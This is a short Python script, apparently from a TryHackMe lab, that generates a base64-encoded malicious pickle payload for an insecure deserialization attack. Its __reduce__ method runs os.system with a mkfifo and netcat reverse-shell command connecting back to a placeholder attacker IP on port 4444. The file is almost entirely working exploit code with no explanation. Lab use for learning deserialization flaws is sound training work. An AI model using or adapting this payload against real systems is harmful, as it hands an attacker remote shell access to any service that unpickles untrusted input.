# https://gist.githubusercontent.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3/raw/f0fce6310455d8c345bbc9ec81f41d224896b9c5/rce.py

import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat INSERT_YOUR_THM_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
